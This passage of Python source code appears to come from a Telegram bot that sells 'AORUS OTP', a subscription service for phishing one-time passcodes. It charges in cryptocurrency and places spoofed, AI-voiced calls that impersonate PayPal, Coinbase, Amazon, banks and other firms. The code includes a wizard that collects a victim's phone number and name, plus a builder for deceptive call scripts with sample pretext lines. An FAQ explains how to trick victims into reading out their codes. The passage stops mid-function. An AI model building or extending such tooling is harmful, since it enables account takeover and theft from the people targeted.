                inline_keyboard=[
                    [
                        InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back4")
                    ]
                ]
                )
                await message.answer_audio(Jorch,caption='🚹 Jorch')
                await message.answer_audio(William,caption='🚹 William')
                await message.answer_audio(Emma,caption='🚺 Emma')
                await message.answer_audio(Lara,caption='🚺 Lara',reply_markup=back_button)
            elif check_subscription(get_user_info(user_id,'Expiry_Date')) == False:
                await message.answer("❌ Your subscription has expired.\nTo continue using the service, please activate a new key.",reply_markup=keyboard1)
            else:
                await message.answer("🚫 No active subscription found.\nPlease activate a key to get started.",reply_markup=keyboard1)
        elif get_user_info(user_id,'In_Action')=='FC':
             await message.answer("❌ You can't use commands while configur your first call.")
        else:
             await message.answer("❌ You can't use commands while making a custom script.")


@dp.message(Command("paypal", "venmo", "applepay", "coinbase", "microsoft", "amazon", "quadpay", "cashapp", "citizens", "marcus", "carrier",'creditcard')) #DONE
async def prenuilt_call(message: Message):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'Banned')):
        if get_user_info(user_id,'In_Action')=='NN':
            keyboard1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💰 Plans & Pricing", callback_data="Purchase"),InlineKeyboardButton(text="🛠 Support Team", url=admin_link)]])
            if check_subscription(get_user_info(user_id,'Expiry_Date')) and check_subscription(get_user_info(user_id,'Expiry_Date'))!= 'Null':
                args = message.text.split(maxsplit=3)
                await run_precall_process(user_id,args, message)
            elif check_subscription(get_user_info(user_id,'Expiry_Date'))==False:
                await message.answer("❌ Your subscription has expired.\nTo continue using the service, please activate a new key.",reply_markup=keyboard1)
            elif get_user_info(user_id,'Expiry_Date') =='N/A':
                await message.answer("🚫 No active subscription found.\nPlease activate a key to get started.",reply_markup=keyboard1)
        elif get_user_info(user_id,'In_Action')=='FC':
             await message.answer("❌ You can't use commands while configur your first call.")
        else:
             await message.answer("❌ You can't use commands while making a custom script.")


#RESTART
@dp.callback_query(F.data.in_(["back1","back4"]))#DONE
async def restart(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not(get_user_info(user_id,"Banned")):
        if get_user_info(user_id,'In_Action')=='NN':
            command = callback.data
            count = int(command[-1])
            for i in range(count):
                await bot.delete_message(user_id,callback.message.message_id-i)
            keyboard=InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                        InlineKeyboardButton(text="🦅 Get Started", callback_data="Enter")
                    ],
                    [
                        InlineKeyboardButton(text="💰 Plans & Pricing", callback_data="Purchase")
                    ],
                    [
                        InlineKeyboardButton(text="⚙️ Tools & Commands", callback_data="Commands"),
                        InlineKeyboardButton(text="📚 How It Works", callback_data="Features")
                    ],
                    [
                        InlineKeyboardButton(text="🛠 Support Team", url=admin_link),
                        InlineKeyboardButton(text="🌍 Join Community", callback_data="community")
                    ],
                    [
                        InlineKeyboardButton(text="👤 Account Details", callback_data="profile")
                    ]
                ]
            )
            await callback.message.answer_photo(logo, caption="""🦅 *AORUS OTP — The Ultimate Spoofing Experience*

Since 2022\, AORUS OTP has been at the forefront of Telegram\-based OTP spoofing — delivering elite\-grade AI voice calls\, ultra\-fast global routes\, and unmatched spoofing precision\.

Trusted by thousands\, AORUS OTP combines *military\-grade stealth*\, *automated real\-time controls*\, and *cutting\-edge voice AI*\, making it the *most stable and advanced OTP grabbing system* in the scene\.

Whether you're verifying accounts\, automating workflows — AORUS equips you with the tools to *outpace*\, *outsmart*\, *and outperform*\.

🧠 *Built to Spoof\. Powered by Stability*\.
🤖 AI\-Powered Voice Delivery
🟢 Global Coverage – 24/7 Uptime
🛡 Military\-Grade Spoofing Stealth
🖥 Fully Automated\, Real\-Time Controls
⚡️ Blazing\-Fast Execution – No Delays

💬 Welcome\, *"""+escape_markdown(get_user_info(user_id,'First_Name'))+"""* — you’re now backed by the best\.""", reply_markup=keyboard,parse_mode='MarkdownV2')
        elif get_user_info(user_id,'In_Action')=='FC':
            await callback.message.answer("❌ You can't use buttons while configur you first call.")
        else:
             await callback.message.answer("❌ You can't use buttons while making a custom script.")          


@dp.callback_query(F.data.in_(["endcall"]))#DONE
async def end_call(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not(get_user_info(user_id,"Banned")):
        if get_user_info(user_id,'In_Action')=='NN':
            set_user_value(user_id,'In_Call',False)
            await callback.answer()
        elif get_user_info(user_id,'In_Action')=='FC':
            await callback.message.answer("❌ You can't use buttons while configur you first call.")
        else:
             await callback.message.answer("❌ You can't use buttons while making a custom script.")


#COMMANDS
@dp.callback_query(F.data.in_(["Commands"]))#DONE
async def commands(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not (get_user_info(user_id,'Banned')):
        if get_user_info(user_id,'In_Action')=='NN':
            keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back1")
                ]
            ]
            )
            await callback.message.delete()
            await callback.message.answer("""🦅 *AORUS OTP* \- Commands
❓ *Commands*
    • /redeem    ➜ Redeem a Key
    • /phonelist ➜ Latest Spoof Numbers
    • /plan      ➜ Account Status
    • /help      ➜ Commands List                         
    • /purchase  ➜ Purchase Access
                                                                                
⚙️ *Call modules*
    • /call       ➜ OTP for any service                                                              
    • /paypal     ➜ Paypal OTP
    • /venmo      ➜ Venmo OTP
    • /applepay   ➜ ApplePay OTP
    • /coinbase   ➜ Coinbase OTP
    • /microsoft  ➜ Microsoft OTP
    • /amazon     ➜ Amazon OTP
    • /quadpay    ➜ Quadpay OTP
    • /cashapp    ➜ Cashapp OTP                               
    • /citizens   ➜ Citizens OTP 
    • /marcus     ➜ Marcus OTP
    • /creditcard ➜ CreditCard OTP
    • /carrier    ➜ Carrier OTP 
                                                                                                                                                                            
👤 *Custom commands*
    • /setscript  ➜ Create Custom Script
    • /script     ➜ Check Your Script 
    • /customcall ➜ Custom Script Call     
    • /setvoice   ➜ Set a Voice For Call
    • /voicelist  ➜ Check Voices List
    • /recall     ➜ Recall victim""",reply_markup=keyboard,parse_mode='MarkdownV2')
        elif get_user_info(user_id,'In_Action')=='FC':
            await callback.message.answer("❌ You can't use buttons while configur you first call.")
        else:
             await callback.message.answer("❌ You can't use buttons while making a custom script.")


#COMMANDS
@dp.message(Command("help"))
async def help(message: Message):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'Banned')):
        if get_user_info(user_id,'In_Action')=='NN':
            keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back1")
                ]
            ]
            )
            await message.answer("""🦅 *AORUS OTP* \- Commands
❓ *Commands*
    • /redeem    ➜ Redeem a Key
    • /phonelist ➜ Latest Spoof Numbers
    • /plan      ➜ Account Status
    • /help      ➜ Commands List                         
    • /purchase  ➜ Purchase Access
                                                                                
⚙️ *Call modules*
    • /call       ➜ OTP for any service                                                              
    • /paypal     ➜ Paypal OTP
    • /venmo      ➜ Venmo OTP
    • /applepay   ➜ ApplePay OTP
    • /coinbase   ➜ Coinbase OTP
    • /microsoft  ➜ Microsoft OTP
    • /amazon     ➜ Amazon OTP
    • /quadpay    ➜ Quadpay OTP
    • /cashapp    ➜ Cashapp OTP                               
    • /citizens   ➜ Citizens OTP 
    • /marcus     ➜ Marcus OTP
    • /creditcard ➜ CreditCard OTP
    • /carrier    ➜ Carrier OTP 
                                                                                                                                                                            
👤 *Custom commands*
    • /setscript  ➜ Create Custom Script
    • /script     ➜ Check Your Script 
    • /customcall ➜ Custom Script Call     
    • /setvoice   ➜ Set a Voice For Call
    • /voicelist  ➜ Check Voices List
    • /recall     ➜ Recall victim""",reply_markup=keyboard,parse_mode='MarkdownV2')
        elif get_user_info(user_id,'In_Action')=='FC':
             await message.answer("❌ You can't use commands while configur your first call.")
        else:
             await message.answer("❌ You can't use commands while making a custom script.")


#PROFILE
@dp.callback_query(F.data.in_(["profile"])) #DONE
async def profile(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not (get_user_info(user_id,'Banned')):
        if get_user_info(user_id,'In_Action')=='NN':
            expiry_date = get_user_info(user_id,'Expiry_Date')
            if check_subscription(expiry_date) != True :
                plan = 'Free'
                status = '🔴 Not Active'
                date = 'N/A'
            else:
                plan = 'Pro'
                status = '🟢 Active'
                date = get_user_info(user_id,'Expiry_Date')[0:16]
            keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="🛠 Support Team", url=admin_link)
                ,
                
                    InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back1")
                ]
            ]
            )
            await callback.message.delete()
            await callback.message.answer("""👤 *Your Profile Details*

🆔 *User ID*\: `"""+str(user_id)+"""`
📛 *Username*\: `"""+escape_markdown(get_user_info(user_id,'Username_Name'))+"""`
⭐️ *Status*\: `"""+status+"""`
📦 *Plan*\: `"""+plan+"""`
⏳ *Plan End in*: `"""+escape_markdown(date)+"""`""",parse_mode='MarkdownV2',reply_markup=keyboard)
        elif get_user_info(user_id,'In_Action')=='FC':
            await callback.message.answer("❌ You can't use buttons while configur you first call.")
        else:
             await callback.message.answer("❌ You can't use buttons while making a custom script.")


@dp.callback_query(F.data.in_(["Features"])) #DONE
async def features(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not (get_user_info(user_id,'Banned')):
        if get_user_info(user_id,'In_Action')=='NN':
            keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="💰 Plans & Pricing", callback_data="Purchase")
                ,
                
                    InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back1")
                ]
            ]
            )
            await callback.message.delete()
            await callback.message.answer(text="""🦅 *AORUS OTP*

❓ Here you can find frequently asked questions that we have compiled for you in an organized and user\-friendly manner\. They'll be updated as we go\!

ℹ️ OTP Phishing is when you make a call pretending to be from a certain company requesting for OTP Code sent to the device\. For example\, if you tried to login into an account protected by OTP\, you could make the call pretending to be the service itself requesting the OTP Code for Account Security Purposes and it will get sent back to you\.

💬 If you can't find the answer you're looking for\, feel free to reach out to our support team\. Warm regards\, Support\.""",parse_mode='MarkdownV2',reply_markup=keyboard)
        elif get_user_info(user_id,'In_Action')=='FC':
            await callback.message.answer("❌ You can't use buttons while configur you first call.")
        else:
             await callback.message.answer("❌ You can't use buttons while making a custom script.")


#COMMUNITY
@dp.callback_query(F.data.in_(["community"])) #DONE
async def community(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not (get_user_info(user_id,'Banned')):
        if get_user_info(user_id,'In_Action')=='NN':
            keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="📢 Main Channel", url=main_channel_link),
                    InlineKeyboardButton(text="✅ Vouches Channel", url=vouches_link)
                ],
                [
                    InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back1")
                ]
            ]
            )
            await callback.message.delete()
            await callback.message.answer_photo(logo, caption="""Welcome to *AORUS OTP*\! 🚀 
Stay connected with our Telegram channels for the latest updates\, exclusive features\, and real\-time support\. 
Whether you're here for fast OTP services or want to stay informed about new tools and improvements\, our channels have you covered\.
Join us and be part of the growing *AORUS OTP community*\!""",parse_mode='MarkdownV2',reply_markup=keyboard)
        elif get_user_info(user_id,'In_Action')=='FC':
            await callback.message.answer("❌ You can't use buttons while configur you first call.")
        else:
             await callback.message.answer("❌ You can't use buttons while making a custom script.")


@dp.callback_query(F.data.in_(["Purchase"])) #DONE
async def purchase(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not (get_user_info(user_id,'Banned')):
        if get_user_info(user_id,'In_Action')=='NN':
            keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="⚡ 1 Day 30$", callback_data="30")
                ],
                [
                    InlineKeyboardButton(text="⏱️ 3 Days 55$", callback_data="55")
                ],
                [
                    InlineKeyboardButton(text="🗓️ 1 Week 95$", callback_data="95")
                ],
                [
                    InlineKeyboardButton(text="📅 1 Month 210$", callback_data="210")
                ],
                [
                    InlineKeyboardButton(text="📱 Spoof Number 20$", callback_data="20")
                ],
                [
                    InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back1")
                ]
            ]
            )
            await callback.message.delete()
            await callback.message.answer_photo(logo2 ,caption="""💸 Choose your subscription type:""",reply_markup=keyboard)
        elif get_user_info(user_id,'In_Action')=='FC':
            await callback.message.answer("❌ You can't use buttons while configur you first call.")
        else:
             await callback.message.answer("❌ You can't use buttons while making a custom script.")


@dp.callback_query(F.data.in_(["Enter"])) #DONE
async def purchase(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not (get_user_info(user_id,'Banned')):
        if get_user_info(user_id,'In_Action')=='NN':
            await callback.message.delete()
            keyboard1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💰 Plans & Pricing", callback_data="Purchase"),InlineKeyboardButton(text="🛠 Support Team", url=admin_link)]])
            if check_subscription(get_user_info(user_id,'Expiry_Date')) == True:
                enter_buttons = InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                        InlineKeyboardButton(text="⚙️ Aorus Tools", callback_data="Commands"),InlineKeyboardButton(text="📞 Start Call", callback_data="startcall")
                    ],
                    [
                        InlineKeyboardButton(text="📘 How It Works ", callback_data="Features")
                    ],[
                        InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back1")
                    ]
                ]
                )
                await callback.message.answer('''🎉 *Welcome\, '''+escape_markdown(get_user_info(user_id,'First_Name'))+'''\!*

You're now an *active subscriber* of **AORUS OTP** — the most advanced Telegram spoofing suite\.

🔐 Your access has been verified\.

*Here’s what you can do*\:
📞 *Spoof Voice Call* — launch a real\-time AI call
⚙️ *Use Tools* — modules & features
📘 *How It Works* — step\-by\-step guide

You're all set\. 👇 Choose an option below to begin\.''',parse_mode='MarkdownV2',reply_markup=enter_buttons)

            elif check_subscription(get_user_info(user_id,'Expiry_Date')) == False:
                await callback.message.answer("❌ Your subscription has expired.\nTo continue using the service, please activate a new key.",reply_markup=keyboard1)
            else:
                await callback.message.answer("🚫 No active subscription found.\nPlease activate a key to get started.",reply_markup=keyboard1)
        elif get_user_info(user_id,'In_Action')=='FC':
            await callback.message.answer("❌ You can't use buttons while configur you first call.")
        else:
             await callback.message.answer("❌ You can't use buttons while making a custom script.")



@dp.message(Command("purchase")) #DONE
async def purchase(message: Message, bot:Bot):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'Banned')):
        if get_user_info(user_id,'In_Action')=='NN':
            keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="⚡ 1 Day 30$", callback_data="30")
                ],
                [
                    InlineKeyboardButton(text="⏱️ 3 Days 55$", callback_data="55")
                ],
                [
                    InlineKeyboardButton(text="🗓️ 1 Week 95$", callback_data="95")
                ],
                [
                    InlineKeyboardButton(text="📅 1 Month 210$", callback_data="210")
                ],
                [
                    InlineKeyboardButton(text="📱 Spoof Number 20$", callback_data="20")
                ],
                [
                    InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back1")
                ]
            ]
            )
            await message.answer_photo(logo2 ,caption="""💸 Choose your subscription type:""",reply_markup=keyboard)
        elif get_user_info(user_id,'In_Action')=='FC':
             await message.answer("❌ You can't use commands while configur your first call.")
        else:
             await message.answer("❌ You can't use commands while making a custom script.")


#WALLETS LIST
@dp.callback_query(F.data.in_(['30','55','95','210','20'])) #DONE
async def prices(callback: CallbackQuery, bot: Bot):
    amount = callback.data
    btc,usdt,eth,ltc,sol='btc+'+amount,'usdt+'+amount,'eth+'+amount,'ltc+'+amount,'sol+'+amount
    user_id = callback.from_user.id
    if not (get_user_info(user_id,'Banned')):
        if get_user_info(user_id,'In_Action')=='NN':
            keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                        InlineKeyboardButton(text="🛠 Support Team", url=admin_link)
                    ],
                    [
                        InlineKeyboardButton(text="₿ BTC", callback_data=btc)
                    ],
                    [
                        InlineKeyboardButton(text="💲 USDT", callback_data=usdt),
                        InlineKeyboardButton(text="♢ ETH", callback_data=eth)
                    ],
                    [
                        InlineKeyboardButton(text="𝑳 LTC", callback_data=ltc),
                        InlineKeyboardButton(text="◎ SOL", callback_data=sol)
                    ],
                    [
                        InlineKeyboardButton(text="🔙 BACK TO PRICES", callback_data='Purchase')
                    ]
                ]
                )
            await callback.message.delete()
            await callback.message.answer_photo(crypto,caption="""💸Please choose one of the following wallets bellow:
ℹ For other wallet please contact Support.""",reply_markup=keyboard)
        elif get_user_info(user_id,'In_Action')=='FC':
            await callback.message.answer("❌ You can't use buttons while configur you first call.")
        else:
             await callback.message.answer("❌ You can't use buttons while making a custom script.")


#BTC
@dp.callback_query(F.data.in_(['btc+20', 'btc+30', 'btc+55', 'btc+95', 'btc+210','eth+20', 'eth+30', 'eth+55', 'eth+95', 'eth+210','usdt+20', 'usdt+30', 'usdt+55', 'usdt+95', 'usdt+210','sol+20', 'sol+30', 'sol+55', 'sol+95', 'sol+210','ltc+20', 'ltc+30', 'ltc+55', 'ltc+95', 'ltc+210'])) #DONE
async def btc_wallet(callback: CallbackQuery):
    user_id=callback.from_user.id
    if not (get_user_info(user_id,'Banned')):
        if get_user_info(user_id,'In_Action')=='NN':
            com = callback.data
            symbole = com[:com.find('+')]
            amount = com[com.find('+')+1:]
            keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                InlineKeyboardButton(text="🛠 Support Team", url=admin_link),
                InlineKeyboardButton(text="🔙 BACK TO PRICING MENU", callback_data="Purchase")
                ]
            ]
            )
            await callback.message.delete()
            await callback.message.answer(get_wallet_message(symbole,int(amount)),parse_mode='MarkdownV2', reply_markup=keyboard)
        elif get_user_info(user_id,'In_Action')=='FC':
            await callback.message.answer("❌ You can't use buttons while configur you first call.")
        else:
             await callback.message.answer("❌ You can't use buttons while making a custom script.")


class CustomSteps(StatesGroup):
    step1 = State()
    step2 = State()
    step3 = State()

class SpoofCallSteps(StatesGroup):
    victim_number = State()
    spoof_number = State()
    victim_name = State()
    service_name = State()
    otp_digit = State()


@dp.message(Command("setscript"))
async def setscript(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if get_user_info(user_id,'Banned')==False:
        if get_user_info(user_id,'In_Action')=='NN':
            keyboard1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💰 Plans & Pricing", callback_data="Purchase"),InlineKeyboardButton(text="🛠 Support Team", url=admin_link)]])
            if check_subscription(get_user_info(user_id,'Expiry_Date')) == True:
                set_user_value(user_id,'In_Action','CS')
                await message.answer("""💬 *Step 1 of 3*\: Please enter the first part of your script\.
This is the message the user will hear first\.

📝 *Example*:
Hello `\{name\}`\, we’ve noticed unusual activity on your `\{service\}` account\. If this wasn’t you\, please press 1\.

📌 *Available Variables*\:
`\{name\}` – the recipient's name
`\{service\}` – the platform or service name
`\{otpdigits\}` – the code or digits you want to insert""",parse_mode="MarkdownV2")
                await state.set_state(CustomSteps.step1)
                await state.update_data(start_time=datetime.now().isoformat())
            elif check_subscription(get_user_info(user_id,'Expiry_Date'))==False:
                await message.answer("❌ Your subscription has expired.\nTo continue using the service, please activate a new key.",reply_markup=keyboard1)
            elif get_user_info(user_id,'Expiry_Date') =='N/A':
                await message.answer("🚫 No active subscription found.\nPlease activate a key to get started.",reply_markup=keyboard1)
        elif get_user_info(user_id,'In_Action')=='FC':
            await message.answer("❌ You can't use commands while configur you first call.")


@dp.message(Command("resetscript"))
async def resetscript(message: Message):
    user_id = message.from_user.id
    if get_user_info(user_id,'Banned')==False:
        if get_user_info(user_id,'In_Action')=="NN":
            keyboard1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💰 Plans & Pricing", callback_data="Purchase"),InlineKeyboardButton(text="🛠 Support Team", url=admin_link)]])
            if check_subscription(get_user_info(user_id,'Expiry_Date')) == True:
                set_user_value(user_id,'Custom_Script','N/A')
                await message.answer("✅ Custom script reset succesfully!")
            elif check_subscription(get_user_info(user_id,'Expiry_Date'))==False:
                await message.answer("❌ Your subscription has expired.\nTo continue using the service, please activate a new key.",reply_markup=keyboard1)
            elif get_user_info(user_id,'Expiry_Date') =='N/A':
                await message.answer("🚫 No active subscription found.\nPlease activate a key to get started.",reply_markup=keyboard1)
        elif get_user_info(user_id,'In_Action')=='FC':
            await message.answer("❌ You can't use commands while configur you first call.")
        else:
             await message.answer("❌ You can't use commads while making a custom script.")

@dp.message(CustomSteps.step1)
async def handle_step1(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if get_user_info(user_id,'Banned')==False:
        data = await state.get_data()
        started = datetime.fromisoformat(data.get("start_time"))
        if datetime.now() - started > timedelta(minutes=20):  # 5 min timeout
            await state.clear()
            return await message.answer("⏱️ Timeout: The custom script creating process was cancelled. Please start again.")
        await state.update_data(value1=message.text)
        await message.answer("""💬 *Step 2 of 3*\: Please enter the second part of your script\.
This follows the user's response from the first message\.

📝 *Example*\:
To block this request\, please enter the `\{otpdigits\}`\-digit security code we just sent\.

📌 *Available Variables*\:
`\{name\}` – the recipient's name
`\{service\}` – the platform or service name
`\{otpdigits\}` – the security code or number of digits""",parse_mode='MarkdownV2')
        await state.set_state(CustomSteps.step2)


@dp.message(CustomSteps.step2)
async def handle_step2(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if get_user_info(user_id,'Banned')==False:
        data = await state.get_data()
        started = datetime.fromisoformat(data.get("start_time"))
        if datetime.now() - started > timedelta(minutes=20):  # 5 min timeout
            await state.clear()
            return await message.answer("⏱️ Timeout: The custom script creating process was cancelled. Please start again.")
        await state.update_data(value2=message.text)
        await message.answer("""💬 *Step 3 of 3*\: Please enter the final part of your script\.
This message is played after the user enters the security code\.

📝 *Example*\:
The code you provided is valid\. The request has been successfully blocked\.

📌 Available Variables\:
`\{name\}` – the recipient's name
`\{service\}` – the platform or service name
`\{otpdigits\}` – the entered security code""",parse_mode="MarkdownV2")
        await state.set_state(CustomSteps.step3)


@dp.message(CustomSteps.step3)
async def handle_step3(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if get_user_info(user_id,'Banned')==False:
        data = await state.get_data()
        started = datetime.fromisoformat(data.get("start_time"))
        if datetime.now() - started > timedelta(minutes=20):  # 5 min timeout
            await state.clear()
            return await message.answer("⏱️ Timeout: The custom script creating process was cancelled. Please start again.")
        user_id = message.from_user.id
        set_user_value(user_id,'In_Action','NN')
        await state.update_data(value3=message.text)
        data = await state.get_data()
        script = "*1\)*\n "+escape_markdown(data['value1'])+"\n\n*2\)*\n "+escape_markdown(data['value2'])+"\n\n*3\)*\n "+escape_markdown(data['value3'])
        set_user_value(user_id,'Custom_Script',script)
        # You now have value1, value2, value3
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back1")
                ]
            ]
            )
        await message.answer(f"✅ Script Created Successfully!\nUse /script To check your Custom Script.",reply_markup=keyboard)
        
        await state.clear()

@dp.callback_query(F.data == "startcall")
async def spoof_button_clicked(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if get_user_info(user_id,'Banned')==False:
        if get_user_info(user_id,'In_Action')=='NN':
            if get_user_info(user_id,'First_Call')=='N/A':
                set_user_value(user_id,'In_Action','FC')
                keyboard1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💰 Plans & Pricing", callback_data="Purchase"),InlineKeyboardButton(text="🛠 Support Team", url=admin_link)]])
                if check_subscription(get_user_info(user_id,'Expiry_Date')) == True:
                    await callback.answer()  # Stop loading animation
                    await callback.message.delete()
                    await callback.message.answer("📞 *1 Of 5*\:\n\nIn this step you have to enter the victim number and you must provide a valid phone number and the victim number must be non spoof number in the systeme\.\nPlease enter the victim’s phone number \(include country code\)\:",parse_mode='MarkdownV2')
                    await state.set_state(SpoofCallSteps.victim_number)
                    await state.update_data(start_time=datetime.now().isoformat())
                elif check_subscription(get_user_info(user_id,'Expiry_Date'))==False:
                        await callback.message.answer("❌ Your subscription has expired.\nTo continue using the service, please activate a new key.",reply_markup=keyboard1)
                elif get_user_info(user_id,'Expiry_Date') =='N/A':
                    await callback.message.answer("🚫 No active subscription found.\nPlease activate a key to get started.",reply_markup=keyboard1)
            else:
                await callback.message.answer("⚠ You Already made your first call\.\n `"+escape_markdown(get_user_info(user_id,'First_Call'))+"`",parse_mode='MarkdownV2')
        elif get_user_info(user_id,'In_Action')=='CS':
             await callback.message.answer("❌ You can't use buttons while making a custom script.")

@dp.message(SpoofCallSteps.victim_number)
async def get_victim_number(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if get_user_info(user_id,'Banned')==False:
        data = await state.get_data()
        started = datetime.fromisoformat(data.get("start_time"))
        if datetime.now() - started > timedelta(minutes=20):  # 5 min timeout
            await state.clear()
            return await message.answer("⏱️ Timeout: The first call creating process was cancelled. Please start again.")
        victim_number = message.text
        if is_valid_phone_number(victim_number)==False or victim_number in spoofing_numbers:
            if is_valid_phone_number(victim_number)==False:
                error = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/5')]])
                await message.answer("❌ Invalid victim phone number format. Please enter a valid number including country code.",reply_markup=error)
                return
            else:
                error = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/10')]])
                await message.answer("❌ This number is in the spoofing list. Please choose a different one.",reply_markup=error)
                return
        await state.update_data(victim_number=message.text)
        await message.answer("📞 *2 Of 5*\:\n\nIn this step you have to enter one of our spoof numbers and you must provide an valid and exist phone number in the spoof systeme\.\nPlease enter the spoof phone number\, use /phonelist to check spoof list\:",parse_mode='MarkdownV2')
        await state.set_state(SpoofCallSteps.spoof_number)


@dp.message(SpoofCallSteps.spoof_number)
async def get_spoof_number(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if get_user_info(user_id,'Banned')==False:
        data = await state.get_data()
        started = datetime.fromisoformat(data.get("start_time"))
        if datetime.now() - started > timedelta(minutes=20):  # 5 min timeout
            await state.clear()
            return await message.answer("⏱️ Timeout: The first call creating process was cancelled. Please start again.")
        if not is_valid_phone_number(message.text):
            error = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/5')]])
            await message.answer("❌ Invalid spoof phone number format. Please enter a valid number including country code.",reply_markup=error)
            return
        elif message.text not in spoofing_numbers:
            error = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/6')]])
            await message.answer("❌ Phone number not found. Please check the spoof list and try again.",reply_markup=error)
            return 
        await state.update_data(spoof_number=message.text)
        await message.answer("📞 *3 Of 5*\:\n\nIn this step you have to enter the victim name this is the name who the bot will use when make the call and this name must contain only characters and not exist in services name\, use /phonelist to check spoof list\.\nPlease enter the victim name\:",parse_mode='MarkdownV2')
        await state.set_state(SpoofCallSteps.victim_name)


@dp.message(SpoofCallSteps.victim_name)
async def get_victim_name(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if get_user_info(user_id,'Banned')==False:
        data = await state.get_data()
        started = datetime.fromisoformat(data.get("start_time"))
        if datetime.now() - started > timedelta(minutes=20):  # 5 min timeout
            await state.clear()
            return await message.answer("⏱️ Timeout: The first call creating process was cancelled. Please start again.")
        if not message.text.isalpha():
            error = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/8')]])
            await message.answer("❌ Invalid name format. Names should only contain lower and upper case letters.",reply_markup=error)
            return
        elif message.text.upper() in spoofing_services:
            error = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/12')]])
            await message.answer("❌ Name Conflicts with a Service Name. Names can't be a service name.",reply_markup=error)
            return
        await state.update_data(victim_name=message.text)
        data = await state.get_data()
        spoof_number = data.get('spoof_number')
        await message.answer("📞 *4 Of 5*\:\n\nIn this step you have to enter the service or the company name and the service name related by the spoof number per example you choose the `"+escape_markdown(spoof_number)+"` then the service name will be `"+get_service_name_bynum(spoof_number)+"`\.",parse_mode='MarkdownV2')
        await state.update_data(service_name=get_service_name_bynum(spoof_number))
        await message.answer("📞 *5 Of 5*\:\n\nIn this step you have to enter the otp length it must be between 4 and 8 and digits not text\.",parse_mode='MarkdownV2')
        await state.set_state(SpoofCallSteps.otp_digit)

    

@dp.message(SpoofCallSteps.otp_digit)
async def get_otp_digit(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if get_user_info(user_id,'Banned')==False:
        data = await state.get_data()
        started = datetime.fromisoformat(data.get("start_time"))
        if datetime.now() - started > timedelta(minutes=20):  # 5 min timeout
            await state.clear()
            return await message.answer("⏱️ Timeout: The first call creating process was cancelled. Please start again.")
        if check_otp_len(message.text)==False:
            error = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/9')]])
            await message.answer("❌ Invalid OTP length. Please enter between 4 and 8 digits.",reply_markup=error)
            return
        elif check_otp_len(message.text)=='Null':
